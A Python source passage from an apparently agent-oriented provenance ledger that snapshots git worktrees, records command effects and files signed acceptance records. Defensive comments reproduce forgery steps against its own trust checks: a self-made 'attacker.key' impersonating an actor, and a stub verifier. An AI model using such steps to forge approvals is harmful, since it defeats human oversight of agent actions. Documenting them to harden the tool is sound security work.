        excludes the ledger at ANY depth (a leading `**/` matches zero or more
        components, so the top level is covered too).
      * Both pathspecs were cwd-relative. Run from `sub/`, `-- .` silently
        NARROWED the snapshot from the whole worktree to the cwd subtree (a
        wrapped command mutating anything outside cwd became unobserved), and
        `git rm --cached -- .oaip` referred to `sub/.oaip`, so a HEAD-tracked
        root `.oaip` survived into every tree written here. `:/` (add) and
        `:(top,…)` (both) resolve from the repository root regardless of cwd.
      * `:(top,exclude,glob)` matched CASE-SENSITIVELY, and this repository's own
        development platform (macOS/APFS) is case-INSENSITIVE. `OAIP.mkdir(
        exist_ok=True)` therefore succeeds into a pre-existing `.OAIP`, every
        later `.oaip/...` write lands there, and git reports the REAL on-disk
        name — which `**/.oaip/**` does not match. Measured on macOS before this
        fix: with `.OAIP/dev.key` HEAD-tracked, the snapshot tree listed
        `.OAIP/dev.key` and the key's blob was in `.git/objects`; with an
        untracked `.OAIP` and a DIRECTORY named `.gitignore` (so wall 2 only
        warns), the tree gained `.OAIP/dev.key`, `.OAIP/ledger.db`,
        `.OAIP/tmp.index` and `.OAIP/tmp.index.lock`. `icase` closes it; on a
        case-SENSITIVE filesystem it costs only that a directory deliberately
        named `.OAIP` is also treated as a ledger and left out — the safe
        direction for a signing key.
    Verified against git 2.50: top-level and nested, from root and from a
    subdirectory, with and without a HEAD-tracked `.oaip`, and in both letter
    cases on a case-insensitive filesystem."""
    tmp_index = OAIP / "tmp.index"
    env = dict(os.environ, GIT_INDEX_FILE=str(tmp_index.resolve()))
    # A SYMLINKED ledger has a second name, and the exclusion is by name (F6).
    # Say so loudly — the arrangement is very likely a mistake — and exclude the
    # real path too, so saying so is not the only protection.
    target = symlinked_ledger_target()
    extra_add, extra_rm = [], []
    if target:
        print(f"warning: {OAIP} is a SYMLINK to {target}; the ledger and its "
              "signing key live outside the path this snapshot excludes by name. "
              f"Excluding {target} as well — but move the ledger back inside "
              f"{OAIP} rather than relying on this.", file=sys.stderr)
        extra_add = [f":(top,exclude,glob,icase){target}/**",
                     f":(top,exclude,glob,icase){target}"]
        extra_rm = [f":(top,glob,icase){target}/**", f":(top,glob,icase){target}"]
    # seed the throwaway index from HEAD if it exists, else empty, then add all
    subprocess.run(["git", "read-tree", "HEAD"], env=env, capture_output=True)
    subprocess.run(["git", "add", "-A", "--", ":/",
                    ":(top,exclude,glob,icase)**/.oaip/**",
                    ":(top,exclude,glob,icase)**/.oaip", *extra_add],
                   env=env, capture_output=True)
    # If HEAD itself tracks .oaip (a user committed it before init learned to
    # gitignore it), read-tree seeded those entries; drop them so no tree this
    # function writes ever contains the key or the store — at any depth, from
    # any cwd.
    subprocess.run(["git", "rm", "-r", "-q", "--cached", "--ignore-unmatch",
                    "--", ":(top,glob,icase)**/.oaip/**",
                    ":(top,glob,icase)**/.oaip", *extra_rm],
                   env=env, capture_output=True)
    tree = subprocess.run(["git", "write-tree"], env=env, capture_output=True, text=True).stdout.strip()
    tmp_index.unlink(missing_ok=True)
    return tree


def env_fingerprint() -> str:
    manifest = {
        "uname": subprocess.run(["uname", "-sm"], capture_output=True, text=True).stdout.strip(),
        "git": git("--version"),
        "python": sys.version.split()[0],
    }
    return sha256(json.dumps(manifest, sort_keys=True).encode())


def effects_between(before_tree: str, after_tree: str):
    """Per-file mutations: (path, status, before_blob, after_blob) via diff-tree."""
    out = git("diff-tree", "-r", "--no-commit-id", before_tree, after_tree)
    for line in out.splitlines():
        if not line:
            continue
        meta, path = line.split("\t", 1)
        _, _, before_blob, after_blob, status = meta.split()[:5]
        zero = "0" * 40
        yield {
            "path": path,
            "status": {"A": "created", "M": "modified", "D": "deleted"}.get(status[0], status),
            "before_blob": None if before_blob == zero else before_blob,
            "after_blob": None if after_blob == zero else after_blob,
        }


# ---------- ledger (SQLite projection) ----------
def db(path=None):
    con = sqlite3.connect(path or DB)
    con.execute("PRAGMA foreign_keys=ON")
    # Wait for a writer instead of raising. A concurrent `accept` and `rebuild`
    # used to abort with an uncaught sqlite3.OperationalError and LOSE the insert
    # (F10, 2026-07-30); the lock below is the real serialisation, this is the
    # backstop for every other command that touches the projection.
    con.execute("PRAGMA busy_timeout=10000")
    return con


@contextlib.contextmanager
def store_lock():
    """Serialise the commands that MUTATE the projection.

    THE DEFECT THIS CLOSES (F10, 2026-07-30, second adversarial round). `rebuild`
    deleted `ledger.db` and rebuilt it in place, with nothing excluding a second
    rebuild. Measured: four concurrent `oaip rebuild` runs produced FOUR identical
    acceptance edges for ONE store record (there was no UNIQUE constraint either,
    so nothing downstream noticed) and, depending on timing, a FileNotFoundError
    traceback from `DB.unlink()` racing another process's unlink. A concurrent
    `accept` + `rebuild` raised an uncaught sqlite3.OperationalError and lost the
    insert. Three changes together: this lock, `UNIQUE(claim_id, warrant_id)` on
    the edge, and building the new projection under a temporary name and
    `os.replace`-ing it into place, so no window exists in which the projection is
    absent.

    Advisory `flock` on `.oaip/lock` — inside the ledger, so the exclusion
    pathspecs already keep it out of every snapshot. On a platform without
    `fcntl` the lock degrades to nothing rather than failing; the UNIQUE
    constraint and the atomic rename still hold there."""
    OAIP.mkdir(exist_ok=True)
    if fcntl is None:
        yield
        return
    fh = open(LOCK, "a+")
    try:
        fcntl.flock(fh.fileno(), fcntl.LOCK_EX)
        yield
    finally:
        try:
            fcntl.flock(fh.fileno(), fcntl.LOCK_UN)
        finally:
            fh.close()


def mark_untrusted(reasons):
    """Withdraw the CURRENT projection's authority, without destroying it.

    THE DEFECT THIS CLOSES (2026-07-30, third adversarial round, C2-F1a). A
    rebuild that refuses leaves the previous projection in place — deliberately,
    because fail-closed must not mean destroy-first. But "in place" was also
    "still authoritative": after a projection had been built from a store the
    canonical layer no longer supports (or with a stub verifier), every honest
    rebuild afterwards refused (rc=1) and `oaip log` went on printing "(signed
    decision)" for the forged acceptance, indefinitely. A refusal that leaves a
    known-bad projection readable as truth has refused nothing.

    So the bytes stay — they are evidence, and a diagnosis may need them — and
    the AUTHORITY goes: `oaip log` and `oaip verify` refuse until a rebuild
    succeeds, and a successful rebuild removes this marker itself."""
    if not DB.exists():
        return
    try:
        UNTRUSTED.write_text(json.dumps(
            {"at": int(time.time()), "reasons": [str(r) for r in reasons]},
            sort_keys=True) + "\n")
    except OSError as e:                # cannot mark it: say so, never silently
        print(f"warning: cannot write {UNTRUSTED} ({e}); the projection at {DB} "
              "may assert facts this canonical layer does not support",
              file=sys.stderr)


def untrusted_reason():
    """Why the projection is not to be believed, or None."""
    if not UNTRUSTED.is_file():
        return None
    try:
        doc = loads_ijson(UNTRUSTED.read_bytes())
        reasons = doc.get("reasons") if isinstance(doc, dict) else None
        if isinstance(reasons, list) and reasons:
            return "; ".join(str(r) for r in reasons[:3])
    except (ValueError, OSError):
        pass
    return "a rebuild refused this canonical layer (reason unreadable)"


def require_trusted_projection():
    why = untrusted_reason()
    if why is None:
        return
    sys.exit(f"refusing to report the projection at {DB}: a rebuild REFUSED "
             f"this canonical layer, so what the projection asserts is no longer "
             f"known to be derivable from it — {why}. Fix the canonical layer and "
             f"run `oaip rebuild` (the marker is {UNTRUSTED}; the projection "
             "itself has been left untouched for inspection).")


SCHEMA = """
CREATE TABLE IF NOT EXISTS intents(
  id TEXT PRIMARY KEY, description TEXT NOT NULL, parent_id TEXT, created_at INTEGER);
CREATE TABLE IF NOT EXISTS executions(
  id TEXT PRIMARY KEY, intent_id TEXT, command TEXT NOT NULL, exit_code INTEGER,
  before_tree TEXT, after_tree TEXT, env_fp TEXT, stdout_hash TEXT, created_at INTEGER);
CREATE TABLE IF NOT EXISTS effects(
  id INTEGER PRIMARY KEY AUTOINCREMENT, execution_id TEXT, path TEXT, status TEXT,
  before_blob TEXT, after_blob TEXT);
CREATE TABLE IF NOT EXISTS artifacts(
  hash TEXT PRIMARY KEY, kind TEXT, size INTEGER);
CREATE TABLE IF NOT EXISTS attributions(
  effect_id INTEGER, cause TEXT, method TEXT, confidence_ppm INTEGER);
CREATE TABLE IF NOT EXISTS claims(
  id TEXT PRIMARY KEY, execution_id TEXT, predicate TEXT, check_cmd TEXT,
  check_exit INTEGER, transcript_hash TEXT, subject_hash TEXT, supported INTEGER, created_at INTEGER);
-- UNIQUE because this is the protocol's central edge and it had no constraint at
-- all: four concurrent rebuilds wrote four identical rows for one store record
-- and nothing downstream could tell that from four acceptances (F10, 2026-07-30).
-- One (claim, warrant) pair is one fact.
CREATE TABLE IF NOT EXISTS warrants(
  claim_id TEXT, warrant_id TEXT, created_at INTEGER,
  UNIQUE(claim_id, warrant_id));
"""


# ---------- commands ----------
def cmd_init(_):
    # A SYMLINKED ledger silently relocates the signing key out of the path every
    # exclusion here names, and `init` used to follow the symlink without a word
    # (F6). Refuse: the one moment OAIP owns this directory is when it creates it.
    if OAIP.is_symlink():
        sys.exit(f"refusing to init: {OAIP} is a symlink to "
                 f"{os.readlink(OAIP)!r}. The ledger holds this observer's "
                 "SIGNING KEY, and every protection here excludes it by the name "
                 f"{OAIP} — through a symlink the key lands in the snapshot (and "
                 "in .git/objects) under the target's name instead. Remove the "
                 f"symlink and let `oaip init` create a real {OAIP} directory.")
    OAIP.mkdir(exist_ok=True)
    db().executescript(SCHEMA)
    wrun("--store", str(WSTORE), "init")
    if not WKEY.exists():
        r = wrun("keygen", "--out", str(WKEY))
        # Record the PUBLIC half. OAIP is stdlib-only and cannot derive an Ed25519
        # public key from a seed, so the one moment the pubkey is knowable is the
        # line `warrant keygen` prints. Without it OAIP could not say which key it
        # custodies, and a keyring that cannot name its own key is not a keyring.
        m = re.search(r"\bpubkey\s+([0-9a-f]{64})\b", r.stdout or "")
        if m:
            PUBKEY.write_text(m.group(1) + "\n")
    ensure_trust()
    # Stamp the store format ONCE, and never restamp: this marker is what tells
    # `rebuild` that every accept in this store had the chance to carry an
    # explicit claim link, so a missing one is a defect and not history (F8).
    if not STOREMETA.is_file():
        STOREMETA.write_text(json.dumps(
            {"oaip_store": STORE_FORMAT, "note_convention_since": int(time.time())},
            sort_keys=True) + "\n")
    # Keep the signing key and the store out of the USER's own commits too.
    # workspace_snapshot() excludes .oaip by pathspec, but a plain `git add -A`
    # by the user would still commit dev.key; init owns the directory, so init
    # owns keeping it ignored. Idempotent: never duplicates the line, and a
    # bare `.oaip` already present is already an exclusion — appending `.oaip/`
    # next to it would be noise. A DIRECTORY named .gitignore is not writable
    # config: warn and move on rather than crash (IsADirectoryError, found in
    # the 2026-07-30 adversarial review).
    gitignore = Path(".gitignore")
    if gitignore.exists() and not gitignore.is_file():
        print(f"warning: {gitignore} is not a regular file; add '.oaip/' to "
              "your git excludes yourself", file=sys.stderr)
    else:
        lines = gitignore.read_text().splitlines() if gitignore.is_file() else []
        already = {".oaip", ".oaip/", "/.oaip", "/.oaip/"}
        if not any(l.strip() in already for l in lines):
            with gitignore.open("a") as f:
                if lines and not gitignore.read_text().endswith("\n"):
                    f.write("\n")
                f.write(".oaip/\n")
    print(f"initialized .oaip (ledger + warrant store + dev key)")


def cmd_intent(a):
    i = kid()
    con = db()
    ts = int(time.time())
    # SPEC §5 is a MUST: the canonical layer is content-addressed artifacts plus the
    # Warrant store, and the SQLite index is a PROJECTION that must be rebuildable
    # from it. Records used to exist only as rows -- so deleting the projection
    # destroyed the invocation, the exit code, the state snapshots, the environment
    # fingerprint and the intent link, none of which appeared anywhere
    # content-addressed. Demonstrated 2026-07-30 by deleting ledger.db. The
    # projection was the source of truth, which is the one thing §5 forbids, and
    # the opposite of the SPEC's own closing line.
    put_artifact(canon({"oaip_record": "intent@v1", "id": i,
                        "description": a.description, "parent": a.parent,
                        "ts": ts}), "record:intent")
    con.execute("INSERT INTO intents(id, description, parent_id, created_at) VALUES (?,?,?,?)",
                (i, a.description, a.parent, ts))
    con.commit()
    print(i)
    return i


def cmd_run(a):
    before = workspace_snapshot()
    env_fp = env_fingerprint()
    proc = subprocess.run(a.command, capture_output=True, text=True)
    after = workspace_snapshot()
    stdout_hash = put_artifact((proc.stdout + proc.stderr).encode(), "stdout")
    eid = kid()
    con = db()
    ts = int(time.time())
    effects = list(effects_between(before, after))
    # One canonical artifact carrying the execution AND its effects and
    # attributions, so the whole causal step survives the projection (§5).
    put_artifact(canon({
        "oaip_record": "execution@v1", "id": eid, "intent": a.intent,
        "command": " ".join(a.command), "exit_code": proc.returncode,
        "before_tree": before, "after_tree": after, "env_fp": env_fp,
        "stdout": stdout_hash, "ts": ts,
        "effects": [{"path": e["path"], "status": e["status"],
                     "before": e["before_blob"], "after": e["after_blob"],
                     # Attribution travels with the effect it explains: a causal
                     # claim separated from what it explains is not recoverable.
                     "attribution": {"cause": eid,
                                     "method": "exclusive-command-window",
                                     "confidence_ppm": 999000}}
                    for e in effects],
    }), "record:execution")
    con.execute("""INSERT INTO executions(id,intent_id,command,exit_code,before_tree,after_tree,
                   env_fp,stdout_hash,created_at) VALUES (?,?,?,?,?,?,?,?,?)""",
                (eid, a.intent, " ".join(a.command), proc.returncode, before, after,
                 env_fp, stdout_hash, ts))
    n = 0
    for e in effects:
        cur = con.execute("""INSERT INTO effects(execution_id,path,status,before_blob,after_blob)
                             VALUES (?,?,?,?,?)""",
                          (eid, e["path"], e["status"], e["before_blob"], e["after_blob"]))
        # exclusive-window attribution: we wrapped the command -> high confidence
        con.execute("INSERT INTO attributions(effect_id,cause,method,confidence_ppm) VALUES (?,?,?,?)",
                    (cur.lastrowid, eid, "exclusive-command-window", 999000))
        n += 1
    con.commit()
    print(f"execution {eid}  exit={proc.returncode}  effects={n}  before={before[:10]} after={after[:10]}")
    return eid


def cmd_claim(a):
    con = db()
    ex = con.execute("SELECT id FROM executions WHERE id=?", (a.execution,)).fetchone()
    if not ex:
        sys.exit(f"no execution {a.execution}")
    # validation check — SEPARATE from execution success (exit_code=0 earns nothing)
    chk = subprocess.run(a.check, shell=True, capture_output=True, text=True)
    transcript_hash = put_artifact((chk.stdout + chk.stderr).encode(), "check-transcript")
    supported = 1 if chk.returncode == 0 else 0
    # content-addressed claim subject (what the decision is ABOUT)
    subject = {
        "oaip_subject": "claim@v1",
        "predicate": a.predicate,
        "execution": a.execution,
        "effects": [dict(path=r[0], status=r[1], after=r[2]) for r in
                    con.execute("SELECT path,status,after_blob FROM effects WHERE execution_id=?",
                                (a.execution,)).fetchall()],
    }
    subject_hash = put_artifact(canon(subject), "claim-subject")   # JCS, SPEC §1
    cid = kid()
    # The claim record itself, not only its subject: check command, exit code,
    # verdict and transcript are the §4 evidence that execution success is not
    # acceptance, and they were projection-only until now.
    put_artifact(canon({"oaip_record": "claim@v1", "id": cid,
                        "execution": a.execution, "predicate": a.predicate,
                        "check": a.check, "check_exit": chk.returncode,
                        "supported": bool(supported), "transcript": transcript_hash,
                        "subject": subject_hash, "ts": int(time.time())}),
                 "record:claim")
    con.execute("""INSERT INTO claims(id,execution_id,predicate,check_cmd,check_exit,
                   transcript_hash,subject_hash,supported,created_at) VALUES (?,?,?,?,?,?,?,?,?)""",
                (cid, a.execution, a.predicate, a.check, chk.returncode,
                 transcript_hash, subject_hash, supported, int(time.time())))
    con.commit()
    print(f"claim {cid}  predicate={a.predicate}  check_exit={chk.returncode}  "
          f"{'SUPPORTED' if supported else 'UNSUPPORTED (check failed)'}")
    return cid, bool(supported)


def cmd_accept(a):
    """THE BRIDGE: an accepted claim becomes a signed Warrant record.

    Serialised against `rebuild` (F10): a concurrent accept and rebuild used to
    raise an uncaught sqlite3.OperationalError and lose this insert."""
    with store_lock():
        return _accept(a)


def _accept(a):
    con = db()
    c = con.execute("""SELECT predicate,check_cmd,check_exit,transcript_hash,subject_hash,supported
                       FROM claims WHERE id=?""", (a.claim,)).fetchone()
    if not c:
        sys.exit(f"no claim {a.claim}")
    predicate, check_cmd, check_exit, transcript_hash, subject_hash, supported = c
    if not supported:
        sys.exit("refusing to accept: the claim's validation check did NOT pass "
                 "(execution success is not acceptance)")
    # materialize the subject + policy + check blob + transcript as warrant blobs
    w = lambda *args: wrun("--store", str(WSTORE), *args)
    subject_bytes = (ART / subject_hash).read_bytes()
    subj_file = OAIP / "subject.tmp"
    subj_file.write_bytes(subject_bytes)
    subj = w("blob", "add", str(subj_file)).stdout.strip()
    policy = OAIP / "policy.txt"
    if not policy.exists():
        policy.write_text("OAIP decision policy v0: accept requires a passing validation check.\n")
    pol = w("blob", "add", str(policy)).stdout.strip()
    checkfile = OAIP / "check.tmp"
    checkfile.write_text(check_cmd + "\n")
    transcript_file = OAIP / "transcript.tmp"
    transcript_file.write_bytes((ART / transcript_hash).read_bytes())
    # The subject blob is the claim's SUBJECT, and two claims can share one:
    # {predicate, execution, effects} excludes the check command and verdict, so
    # `--check true` and `--check false` over the same execution collide. A
    # rebuild that re-derived the acceptance edge by subject hash alone projected
    # this one signed warrant onto the FAILED claim too (2026-07-30 adversarial
    # review; §5 violation). So the linkage is made EXPLICIT at accept time: the
    # accepted claim's id rides in subject.note, INSIDE the signed body — rebuild
    # follows it instead of guessing by subject hash. Legacy records without the
    # note fall back to subject-hash matching restricted to supported claims.
    r = w("accept", "--subject", subj, "--under", pol,
          "--check", str(checkfile), "--verdict", "pass",
          "--transcript", str(transcript_file),
          "--reason", f"claim: {predicate}",
          "--note", f"oaip-claim:{a.claim}",
          "--actor", a.actor, "--key", str(WKEY))
    wid = r.stdout.strip()
    for f in (subj_file, checkfile, transcript_file):
        f.unlink(missing_ok=True)
    if len(wid) != 64:
        sys.exit(f"warrant filing failed: {r.stdout} {r.stderr}")
    # created_at is the warrant's OWN signed ts, read back from the store — not a
    # second reading of the clock. The projection row must be re-derivable from
    # the canonical layer alone (§5), and two clock reads can straddle a second
    # boundary: a rebuild that disagrees by one second is not "the same graph".
    env = json.loads((WSTORE / "records" / f"{wid}.json").read_text())
    wts = env["body"]["ts"]
    # BIND THE SIGNER TO THE ACTOR, in OAIP's own keyring, from the record that
    # was just filed. This is the fact `rebuild` will require before it derives an
    # acceptance edge (2026-07-30 review, F7/F3): without it, any self-generated
    # key claiming any actor id produced an edge, because Warrant reports an
    # unbound binding as a WARN by specification and exits 0.
    #
    # The key is read back out of the filed signature rather than assumed, so the
    # binding records what actually signed; when `init` captured the public half
    # it is cross-checked, and a mismatch is fatal — it would mean the store was
    # signed by a key this ledger does not custody.
    signed_key = next((s.get("key") for s in env.get("sigs", [])
                       if isinstance(s, dict) and s.get("actor") == a.actor), None)
    if not (isinstance(signed_key, str) and HEX64.match(signed_key)):
        sys.exit(f"filed warrant {wid[:12]} carries no signature by {a.actor}; "
                 "refusing to record an acceptance nothing signed")
    if PUBKEY.is_file() and PUBKEY.read_text().strip() != signed_key:
        sys.exit(f"filed warrant {wid[:12]} was signed by {signed_key[:12]}, "
                 f"not by this ledger's own key ({PUBKEY.read_text().strip()[:12]})")
    bind_actor(a.actor, signed_key)
    con.execute("INSERT OR IGNORE INTO warrants(claim_id,warrant_id,created_at)"
                " VALUES (?,?,?)", (a.claim, wid, wts))
    con.commit()
    print(f"ACCEPTED -> warrant {wid}\n  (signed, hash-addressed, cites the provenance as evidence "
          f"and the validation as a cmd@v1 check)")


def cmd_bind(a):
    """Record in OAIP's keyring that a key may sign as an actor.

    `cmd_accept` does this automatically for every acceptance it files, so a
    ledger used through `oaip accept`/`oaip do` never needs this command. It
    exists for two honest cases: a store created BEFORE OAIP had a keyring (whose
    acceptances would otherwise stop producing edges at the next rebuild, because
    nothing vouches for their signer), and an acceptance filed through the Warrant
    CLI directly. Naming the key is the operator's assertion, not OAIP's
    discovery — which is why it is a separate, explicit verb."""
    key = a.key
    if key is None:
        if not PUBKEY.is_file():
            sys.exit(f"no {PUBKEY}: this ledger does not know its own public key "
                     "(it predates `init` recording it) — pass --key <hex64>, "
                     "e.g. the `key` field of a signature in "
                     f"{WSTORE / 'records'}")
        key = PUBKEY.read_text().strip()
    if not (isinstance(key, str) and HEX64.match(key)):
        sys.exit("--key must be a 64-hex-character Ed25519 public key")
    bind_actor(a.actor, key)
    print(f"bound key {key[:12]} -> actor {a.actor}  ({TRUST})")


def cmd_do(a):
    """One-shot: intent → run → validate → accept-if-pass. The ergonomic verb —
    an agent action becomes a signed decision only if its validation check
    passes, in a single command (SPEC §4)."""
    from argparse import Namespace
    i = cmd_intent(Namespace(description=a.intent, parent=None))
    eid = cmd_run(Namespace(intent=i, command=a.command))
    cid, supported = cmd_claim(Namespace(execution=eid, predicate=(a.predicate or a.intent),
                                         check=a.check))
    if supported:
        cmd_accept(Namespace(claim=cid, actor=a.actor))
    else:
        print("NOT accepted — validation check failed "
              "(execution success is not acceptance; no warrant filed)")
        sys.exit(1)


def cmd_log(_):
    # A projection a rebuild refused is not a report; it is a suspect (C2-F1a).
    require_trusted_projection()
    con = db()
    for i in con.execute("SELECT id,description FROM intents ORDER BY id"):
        print(f"INTENT {i[0]}  {i[1]}")
        for e in con.execute("SELECT id,command,exit_code,effects_n FROM "
                             "(SELECT e.id,e.command,e.exit_code,COUNT(f.id) effects_n "
                             " FROM executions e LEFT JOIN effects f ON f.execution_id=e.id "
                             " WHERE e.intent_id=? GROUP BY e.id)", (i[0],)):
            print(f"  EXEC {e[0]}  `{e[1]}`  exit={e[2]}  effects={e[3]}")
            for c in con.execute("SELECT id,predicate,supported FROM claims WHERE execution_id=?", (e[0],)):
                sup = "supported" if c[2] else "unsupported"
                print(f"    CLAIM {c[0]}  {c[1]}  [{sup}]")
                for wr in con.execute("SELECT warrant_id FROM warrants WHERE claim_id=?", (c[0],)):
                    print(f"      WARRANT {wr[0][:16]}…  (signed decision)")


def read_warrant_store():
    """(accepts, record_files, errors) over the decision half of the canonical layer.

    Every accept is returned as a dict carrying its subject hash, WarrantID, ts,
    subject note AND ITS ENVELOPE — the envelope, because the signatures are what
    `signer_gate` has to inspect, and re-reading the file later would be a second
    observation of a mutable directory.

    Integrity-checked before anything is derived from it, for the reason
    `read_artifact` gives about the artifact half: a record whose body does not
    hash to its own filename is not that record. Address-matching is NOT
    verification, though — see the three layers named in `cmd_rebuild`."""
    accepts, errors = [], []
    wrec_dir = WSTORE / "records"
    files = sorted(wrec_dir.glob("*.json")) if wrec_dir.is_dir() else []
    for path in files:
        if not HEX64.match(path.stem):
            # Not forged — not a record at all. A stray notes.json used to be
            # reported as "does not match its own address", misdiagnosing a
            # benign file as a forgery. Say what it is, precisely.
            errors.append(f"warrant store: stray file {path.name} in records/ — "
                          "its name is not a record address; remove it (the "
                          "Warrant store treats every records/*.json as a record)")
            continue
        try:
            doc = loads_ijson(path.read_bytes())
        except OSError as e:
            # A DIRECTORY named <hex64>.json is a legal record ADDRESS that is not
            # a record. The except clause here was narrowed to ValueError, so this
            # raised IsADirectoryError and printed a traceback instead of a
            # diagnosis (F12, 2026-07-30).
            kind = "a directory" if path.is_dir() else "unreadable"
            errors.append(f"warrant store: {kind} at record address "
                          f"{path.name} ({type(e).__name__}) — not a record; "
                          "remove it")
            continue
        except ValueError as e:
            errors.append(f"warrant {path.stem[:12]}: unreadable record: {e}")
            continue
        body = doc.get("body") if isinstance(doc, dict) else None
        if not isinstance(body, dict):
            # A crafted non-dict body at a valid address used to crash this
            # function with an AttributeError; a refusal is a decision, a
            # traceback is an accident.
            errors.append(f"warrant {path.stem[:12]}: envelope has no body object "
                          "— not a warrant record")
            continue
        if sha256(canon(body)) != path.stem:
            errors.append(f"warrant {path.stem[:12]}: body hashes to "
                          f"{sha256(canon(body))[:12]} — record does not match "
                          "its own address")
            continue
        if body.get("decision") == "accept":
            subj = body.get("subject") if isinstance(body.get("subject"), dict) else {}
            accepts.append({"subject": subj.get("hash"), "wid": path.stem,
                            "ts": body.get("ts"),
                            "note": subj.get("note") if isinstance(subj.get("note"), str) else "",
                            "env": doc})
    return accepts, files, errors


def signer_gate(report, actors, unbound_sigs):
    """Return `assess(wid, env) -> (refusal|None, notes)`: does this record's
    signature establish WHO accepted?

    THE DEFECT THIS CLOSES (F7/F3, 2026-07-30, second adversarial round). The
    previous gate was `warrant verify` exiting 0, and Warrant exits 0 for a
    cryptographically valid signature whose key nobody vouches for — by
    specification (§5: report the binding as unverified; §5.1: "Bound/unbound is
    a report"). Reproduced end to end on this branch before this function:

        warrant keygen --out attacker.key
        warrant --store .oaip/warrants accept --subject <a real claim's subject> \\
                --note oaip-claim:<that claim's id> --actor tester@local \\
                --key attacker.key
        oaip rebuild   ->  warrant=1
        oaip log       ->  WARRANT 41d32da62a81…  (signed decision)

    for a claim NOBODY accepted, with the actor `tester@local` freely
    impersonated. The condition that must hold is one condition, about ONE
    signature — the one the record's own `body.actor.id` is answerable for:
      * it VERIFIES under OAIP's own Ed25519 check, over the WarrantID OAIP
        recomputed from the record's bytes (C2-F1a: delegating this to a
        subprocess named by an environment variable made it forgeable); and
      * it names a key bound to that actor in `.oaip/trust.json` — the ENFORCED
        rule, OAIP's own, because Warrant has none to enforce; and
      * Warrant's settlement grade does not itself call THAT signature unbound
        against that same keyring file — corroboration, not the primary check.

    Everything else on the record is a NOTE. Requiring all signatures to be bound
    (and treating any "excluded signature" finding as fatal) made an appended
    co-signature — which Warrant SPEC §5 explicitly permits, and which
    `warrant verify` passes at 0 errors — silently delete the acceptance edge
    (C2-F1b). A second endorser must be expressible; a griefer must not be able
    to erase a decision by adding to it."""
    per_record = findings_by_record(report) if report else {}

    def assess(wid, env):
        why, notes, key, actor = accepting_signature(wid, env, actors)
        notes += [f"Warrant reports: {m}" for m in per_record.get(wid, [])
                  if any(k in m for k in _AMBIGUOUS_SIG)]
        if why is None and unbound_sigs and key and (
                wid[:12], key[:12], actor) in unbound_sigs:
            why = (f"Warrant's settlement grade reports THIS signature (key "
                   f"{key[:12]}, actor {actor!r}) unbound against {TRUST}")
        return why, notes

    return assess


def cmd_rebuild(a):
    """Reconstruct the SQLite projection from the canonical layer alone (§5).

    The MUST this exists to make true: "Deleting the projection and rebuilding it
    from artifacts + warrants MUST yield the same graph." Until 2026-07-30 there
    was no way to attempt it, and the attempt would have failed -- the invocation,
    exit code, state snapshots and environment fingerprint lived only in rows.

    Reads ONLY the canonical layer -- .oaip/artifacts plus the Warrant store,
    which is exactly what §5 names ("artifacts + warrants"). If it needs the
    database to rebuild the database, the claim is circular and the check is
    worthless. The Warrant store half was missing until later on 2026-07-30:
    rebuild never repopulated the `warrants` table, so the claim→warrant
    ACCEPTANCE edge -- the one fact this protocol exists to record -- survived
    `do` and died at the first rebuild, and `oaip log` silently lost its
    WARRANT line. "The same graph" minus its most important edge is not the
    same graph.
    """
    with store_lock():
        return _rebuild(a)


def _rebuild(a):
    allow_legacy = bool(getattr(a, "allow_legacy_links", False))
    # Read and validate the canonical layer BEFORE touching the projection. A
    # fail-closed check that deletes the database and then refuses to rebuild it
    # has destroyed the thing it was protecting.
    # The two halves of the canonical layer are counted SEPARATELY. Every fault
    # used to be reported as "corrupt artifact(s) in the canonical layer" — so a
    # stray file in the Warrant store, or a Warrant CLI that could not run, was
    # announced as artifact corruption and sent the reader to the wrong directory
    # (F13, 2026-07-30). A diagnosis that names the wrong layer is worse than no
    # diagnosis, because it is acted on.
    records = []
    rec_addr = {}                  # id(doc) -> the address it was read from
    art_bad, store_bad = [], []
    for path in sorted(ART.glob("*")):
        # An artifact whose bytes do not hash to its address is not a record with
        # a problem, it is not that record at all. Rebuilding from it would
        # launder a forgery into the projection — which is exactly what happened
        # before this check existed.
        doc, err = read_artifact(path)
        if err:
            art_bad.append(err)
            continue
        if isinstance(doc, dict) and isinstance(doc.get("oaip_record"), str):
            records.append(doc)
            rec_addr[id(doc)] = path.name

    # The other half of the canonical layer: the Warrant store.
    accepts, wrec_files, store_errs = read_warrant_store()
    store_bad += store_errs

    # WHAT VERIFICATION MEANS HERE, IN THREE LAYERS THAT WERE EACH ADDED AFTER
    # THE PREVIOUS ONE WAS BROKEN BY REVIEW (2026-07-30, two rounds):
    #   1. address-matching (above) — satisfied BY CONSTRUCTION by anyone who can
    #      write a file, so it establishes nothing about who decided.
    #   2. `warrant verify` — a corroborating delegate, never the decider. It was
    #      broken as a decider two ways: `WARRANT_CLI=/usr/bin/true` exits 0
    #      having verified nothing, and a cryptographically valid signature by a
    #      key nobody vouches for also exits 0, because Warrant reports an unbound
    #      key↔actor binding as a WARN by SPECIFICATION (§5, §5.1). Requiring a
    #      parseable `warrant.verify-report@v0` ruled out the accident; a stub
    #      that prints one defeated it entirely (third round, C2-F1a). Errors
    #      reported here still refuse a rebuild — a delegate may veto.
    #   3. SIGNATURE + BINDING (this layer, OAIP's own, in process): the
    #      signature by the actor the record NAMES must verify under
    #      `ed25519_verify` over the WarrantID OAIP recomputed, AND name a key
    #      bound to that actor in `.oaip/trust.json`, which only
    #      `cmd_accept`/`oaip bind` ever write. An accept signed by an unknown key
    #      — or by no key at all — gets NO EDGE, whatever any subprocess says.
    #      Other signatures are reported and cannot un-decide it (C2-F1b).
    report, unbound_sigs, actors = None, None, {}
    if wrec_files:
        report, rerr = store_report()
        if rerr:
            store_bad.append(f"warrant store: {rerr}")
        elif report["errors"]:
            first = next((f"{f.get('subject','')[:12]} {f.get('message')}"
                          for f in report["findings"]
                          if isinstance(f, dict) and f.get("level") == "ERR"), "")
            store_bad.append("warrant store: `warrant verify` reported "
                             f"{report['errors']} error(s) — an unverified "
                             f"acceptance must not become an edge ({first})")
        else:
            actors, aerr = read_trust()
            if aerr:
                store_bad.append(f"keyring: {aerr}")
            unbound_sigs = unbound_by_warrant()

    # What the CURRENT projection asserts, read before it is replaced. A rebuild
    # that drops the protocol's central edge must not report success (C2-F1b):
    # one appended co-signature made `oaip rebuild` print `warrant=0`, exit 0,
    # and `oaip log` lose its WARRANT line — a fact deleted, announced as a
    # successful reconstruction.
    prev_edges = set()
    if DB.is_file():
        try:
            con0 = db()
            prev_edges = {(r[0], r[1]) for r in
                          con0.execute("SELECT claim_id, warrant_id FROM warrants")}
